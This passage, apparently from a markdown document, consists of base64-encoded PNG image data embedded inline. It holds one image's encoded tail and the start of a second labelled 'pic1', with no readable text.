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


[pic1]:data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAsYAAAJXCAYAAACQUpJTAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsIAAA7CARUoSoAAAGmRSURBVHhe7d1vbBt3vu/3L0mJpP7ZTpSsLfuc3hxUcoAgt3s22eaBdJp9dgPL2+sLFM2zIimwkIAtCvtJgAIbNNh2c1tgn1gPuqh098GmfRagwC56IiF9lvTauDd3N3tyug3uWgJOLnps2UkU26IskRT/9PudmR81IocSJZEyh3y/7K9mOJwhR6Q5+ujn3/wmUVUCAAAA9LlkMAUAAAD6GsEYAAAAUARjAAAAQBGMAQAAAEUwBgAAABTBGAAAAFAEYwAAAEARjAEAAABFMAYAAAAUwRgAAABQBGMAAABAEYwBAAAARTAGAAAAVKKqgnkAMVIuV6RcKUulUhHxPsV8lAHg+BL+30RSUkmtVFLndQH6CsEYiCH72G7v5L0qFApS1XBcrZbtjmANAMBRJJIpraQMDAzK8FBWa0jnU8G96BcEYyCGKvqxffjosdambG09kUq5pOHYSsMxAOBIrGU4kRrQYDwgWQ3Ez5w9I8+cOyOZdDpYA/2CYAzEUKVSle8ePpINrYebW5IrVGQzX5F8qaqhOSFl+1TrFADQXDJR9WowlZAzmaSMZZNybiQjzz5zTsa1MhmCcb8hGAMxZMF447uH8q3W1w+35N6WePUwn5DdSkJKWroKAKAJazoYSFoorsrQQFUujYpcHBO5cCYj48+ek+fGn5FsJuOvjL5BMAZiyE64+3bDD8b3v8vJP2wm5R8eJ+SbnaTslhNS1LKWYwBAc+lURasqo4NV+auzFfmrMxqQn0nLc88+WwvGnH/XXxiuDQAAwKn65zF7A/4E8+gfBGMAAIAQLxBrMHbhGP2DYAzEiB2frfRYXZsHALSPO8baGD/hcsdd9DaCMRAzdnB2BQBoPwvA4UDsQjHBuPcRjIEY8Q7K+sX91x7/xQcA7Ve1P3qAtbJx461bBcfb/kAwBuLEDsxWNBkDQOdYCnadjN3x1h1/0dMIxkCchIMxB2kAaDtvFNugvHkbFN6Ote64i55GMAYAAAghB/cvgjEAAECIBeJwoX8QjAEAAOoQiPsTwRgAAABQBGMAAABAEYwBAAAARTAGAAAAFMEYAAAAUARjAAAAQBGMAQAAAEUwBmIkkQhmAABA2xGMgRghGAMA0DkEYyBmknxqAQDoCH7EAjFj